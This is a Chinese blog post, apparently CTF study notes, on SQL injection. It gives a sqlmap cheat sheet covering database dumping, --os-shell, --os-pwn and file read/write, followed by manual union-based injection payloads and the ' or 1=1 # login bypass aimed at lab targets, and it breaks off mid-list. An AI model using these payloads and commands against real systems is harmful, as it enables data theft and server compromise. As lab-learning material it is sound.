<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sql注入漏洞 | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入漏洞sqlmap使用方法   Sqlmap使用详解-安全客 - 安全资讯平台 (anquanke.com)  sqlmap -r http.txt  #http.txt是我们抓取的http的请求包 sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测 sqlmap -u &quot;h">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入漏洞">
<meta property="og:url" content="http://dezhoutorizhao.github.io/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
<meta property="og:description" content="sql注入漏洞sqlmap使用方法   Sqlmap使用详解-安全客 - 安全资讯平台 (anquanke.com)  sqlmap -r http.txt  #http.txt是我们抓取的http的请求包 sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测 sqlmap -u &quot;h">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
<meta property="article:published_time" content="2022-02-15T07:09:51.740Z">
<meta property="article:modified_time" content="2024-04-30T12:48:21.780Z">
<meta property="article:author" content="h3110w0r1d">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="sql注入">
<meta property="article:tag" content="手动注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.0.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        if (name && globalFn[key][name]) return
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sql注入漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-30 20:48:21'
}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (true) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(url(https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/background.jpeg));"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">h3110w0r1d's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">sql注入漏洞</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sql注入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-15T07:09:51.740Z" title="发表于 2022-02-15 15:09:51">2022-02-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-30T12:48:21.780Z" title="更新于 2024-04-30 20:48:21">2024-04-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/">sql注入</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/">手动注入</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><h2 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h2><ol>
<li>  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235846#h3-16">Sqlmap使用详解-安全客 - 安全资讯平台 (anquanke.com)</a></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r http.txt  <span class="token comment">#http.txt是我们抓取的http的请求包</span>
sqlmap -r http.txt -p username  <span class="token comment">#指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span>
sqlmap -u <span class="token string">"http://www.xx.com/username/admin*"</span>       <span class="token comment">#如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>   <span class="token comment">#探测该url是否存在漏洞</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>   --cookie<span class="token operator">=</span><span class="token string">"抓取的cookie"</span>   <span class="token comment">#当该网站需要登录时，探测该url是否存在漏洞</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>  --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin&amp;submit=Submit"</span>  <span class="token comment">#抓取其post提交的数据填入</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --users      <span class="token comment">#查看数据库的所有用户</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --passwords  <span class="token comment">#查看数据库用户名的密码</span>
有时候使用 --passwords 不能获取到密码，则可以试下
-D mysql -T user -C host,user,password --dump  当MySQL<span class="token operator">&lt;</span> <span class="token number">5.7</span>时
-D mysql -T user -C host,user,authentication_string --dump  当MySQL<span class="token operator">>=</span> <span class="token number">5.7</span>时
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --current-user  <span class="token comment">#查看数据库当前的用户</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --is-dba    <span class="token comment">#判断当前用户是否有管理员权限</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --roles     <span class="token comment">#列出数据库所有管理员角色，仅适用于oracle数据库的时候</span>

sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --dbs        <span class="token comment">#爆出所有的数据库</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --tables     <span class="token comment">#爆出所有的数据表</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --columns    <span class="token comment">#爆出数据库中所有的列</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>    --current-db <span class="token comment">#查看当前的数据库</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security --tables <span class="token comment">#爆出数据库security中的所有的表</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --columns <span class="token comment">#爆出security数据库中users表中的所有的列</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump  <span class="token comment">#爆出数据库security中的users表中的username列中的所有数据</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> -C username --dump --start <span class="token number">1</span> --stop <span class="token number">100</span>  <span class="token comment">#爆出数据库security中的users表中的username列中的前100条数据</span>

sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security -T <span class="token function">users</span> --dump-all <span class="token comment">#爆出数据库security中的users表中的所有数据</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> -D security --dump-all   <span class="token comment">#爆出数据库security中的所有数据</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --dump-all  <span class="token comment">#爆出该数据库中的所有数据</span>

sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span>  --tamper<span class="token operator">=</span>space2comment.py  <span class="token comment">#指定脚本进行过滤，用/**/代替空格</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --level<span class="token operator">=</span><span class="token number">5</span> --risk<span class="token operator">=</span><span class="token number">3</span> <span class="token comment">#探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-1/?id=1"</span> --sql-shell  <span class="token comment">#执行指定的sql语句</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --os-shell/--os-cmd   <span class="token comment">#执行--os-shell命令，获取目标服务器权限</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --os-pwn   <span class="token comment">#执行--os-pwn命令，将目标权限弹到MSF上</span>

sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --file-read <span class="token string">"c:/test.txt"</span> <span class="token comment">#读取目标服务器C盘下的test.txt文件</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --file-write  test.txt  --file-dest <span class="token string">"e:/hack.txt"</span>  <span class="token comment">#将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span>

sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --dbms<span class="token operator">=</span><span class="token string">"MySQL"</span>     <span class="token comment">#指定其数据库为mysql </span>
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --random-agent   <span class="token comment">#使用任意的User-Agent爆破</span>
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --proxy<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080"</span>    <span class="token comment">#指定代理</span>
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay<span class="token operator">=</span><span class="token number">3</span> --force-ssl
sqlmap -u <span class="token string">"http://192.168.10.1/sqli/Less-4/?id=1"</span> --technique T    <span class="token comment">#指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span>
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d <span class="token string">"mysql://root:root@192.168.10.130:3306/mysql"</span> --os-shell   <span class="token comment">#知道网站的账号密码直接连接</span>

-v3                   <span class="token comment">#输出详细度  最大值5 会显示请求包和回复包</span>
--threads <span class="token number">5</span>           <span class="token comment">#指定线程数</span>
--fresh-queries       <span class="token comment">#清除缓存</span>
--flush-session       <span class="token comment">#清空会话，重构注入 </span>
--batch               <span class="token comment">#对所有的交互式的都是默认的</span>
--random-agent        <span class="token comment">#任意的http头</span>
--tamper base64encode            <span class="token comment">#对提交的数据进行base64编码</span>
--referer http://www.baidu.com   <span class="token comment">#伪造referer字段</span>

--keep-alive     保持连接，当出现 <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> connection dropped or unknown HTTP status code received. sqlmap is going to retry the request<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 保错的时候，使用这个参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="information-schema的内容"><a href="#information-schema的内容" class="headerlink" title="information_schema的内容"></a>information_schema的内容</h2><ol>
<li><p>  SCHEMATA:提供当前mysql实例中所有<strong>数据库</strong>的信息，与show databases的结果相同</p>
</li>
<li><p>  TABLES:提供了关于数据库中表的信息，详细描述该表属于哪个schema</p>
</li>
<li><p>COLUMNS：提供了表的列信息，详细表述了某张表的所有列以及每个列的信息，与show columns from schemaname.tablename相同</p>
  <pre class="line-numbers language-none"><code class="language-none">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。
COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。
STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。
USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。
SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。
TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。
COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。
CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
COLLATIONS表：提供了关于各字符集的对照信息。
COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
KEY_COLUMN_USAGE表：描述了具有约束的键列。
ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。
TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ol>
<h2 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h2><ol>
<li>shcema可以看作是房间</li>
<li>table_schema是用来存放table表的房间，是数据库</li>
<li>table_name是表的名字</li>
<li>table_type是表的类型</li>
</ol>
<h2 id="SQL语句不区分大小写"><a href="#SQL语句不区分大小写" class="headerlink" title="SQL语句不区分大小写"></a>SQL语句不区分大小写</h2><ol>
<li><p>SQL语句不区分大小写，所以如果后端对某些关键词进行了过滤，可以使用大小写绕过</p>
  <pre class="line-numbers language-none"><code class="language-none">SEleCT * FrOm Information_SchEma.SchematA;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h2 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h2><ol>
<li>group_concat可以将多行数据整合为一行</li>
<li>concat可以将不同数据用第一个参数链接</li>
<li>可以写group_concat(concat_ws(‘:’,id,email_id))</li>
</ol>
<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><h3 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h3><ol>
<li>1 and 1=1正确</li>
<li>1 and 1=2不正确，所以可以判断是整数型注入</li>
</ol>
<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><ol>
<li>order by 1,2,3,4….</li>
<li>可以使用二分法来判断</li>
<li>为下一步联合查询爆数据库名奠定基础</li>
<li>数据库ctf</li>
<li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112808285.png" alt="image-20230528112808285"></li>
<li><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20230528112918701.png" alt="image-20230528112918701"></li>
</ol>
<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
<li>?id=1 and 1=2 union select 1,database()</li>
<li>1’ and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata –+</li>
<li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li>
<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li>
</ol>
<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
<li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li>
<li>group_concat()函数是用来将多行转为一行，将组中的字符串连接成为具有各种选项的单个字符串</li>
<li>table_name</li>
<li>information_schema.tables</li>
<li>1’ and 1=2 union select 1,2,group_concat(username) from ctfshow_web.ctfshow_users where id=1  –+</li>
</ol>
<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ol>
<li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li>
<li>column_name</li>
<li>information_schema.columns</li>
</ol>
<h3 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h3><ol>
<li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li>
<li>根据库中的表来查询所有的列中带flag的</li>
<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" alt="HgvAr8.md.png"></a></li>
</ol>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h3><ol>
<li>输入1，2，3…看是否有不同的数据</li>
</ol>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><ol>
<li>1 and 1=1;和1 and 1=2都没错</li>
<li>1’ and 1=1 –+ 没有问题</li>
<li>1’ and 1=2 –+报错</li>
<li>报错是爆出语法错误</li>
<li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li>
</ol>
<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><ol>
<li>?id=1’ order by 2 没问题</li>
<li>?id=1’ order by 3 有问题</li>
</ol>
<h3 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
<li>?id=1’ and 1=2 union select 1,database() –+</li>
<li>得到数据库名为sqli</li>
</ol>
<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
<li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li>
</ol>
<h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><ol>
<li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,flag)) from sqli.flag</li>
<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li>
</ol>
<h3 id="buuctf中的warmup"><a href="#buuctf中的warmup" class="headerlink" title="buuctf中的warmup"></a>buuctf中的warmup</h3><ol>
<li>输入1和1’来判断是字符型还是数字型，发现是字符型注入</li>
<li>使用1’ or 1=1 #来万能绕过</li>
</ol>
<h2 id="万能语句绕过有用户名密码的SQL注入"><a href="#万能语句绕过有用户名密码的SQL注入" class="headerlink" title="万能语句绕过有用户名密码的SQL注入"></a>万能语句绕过有用户名密码的SQL注入</h2><ol>
<li><p>万能语句：</p>
  <pre class="line-numbers language-none"><code class="language-none">1&#39; or 1&#x3D;1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>假设sql语句为</p>
  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"selet * from users where username='<span class="token interpolation"><span class="token variable">$_name</span></span>' and password='<span class="token interpolation"><span class="token variable">$_pwd</span></span>'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>如果在变量name中传入</p>
  <pre class="line-numbers language-none"><code class="language-none">&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>那么最后语句会变成</p>
  <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1# &#39; and password&#x3D;balabala;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>去掉注释后的内容后，语句变为</p>
  <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  因为1=1恒为真，所以where中的查询条件相当于没有</p>
</li>
<li><p>所以语句相当于</p>
  <pre class="line-numbers language-none"><code class="language-none">select * from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>假设语句为</p>
  <pre class="line-numbers language-none"><code class="language-none">&quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>id值传入</p>
  <pre class="line-numbers language-none"><code class="language-none">admin&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>则后面的语句变为</p>
  <pre class="line-numbers language-none"><code class="language-none">&quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;admin&#39; or 1&#x3D;1 # &#39; limit 1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  即limit 1限制和where语句中username != flag的限制都不再起作用</p>
</li>
<li><p>原语句变为如下，爆出所有结果</p>
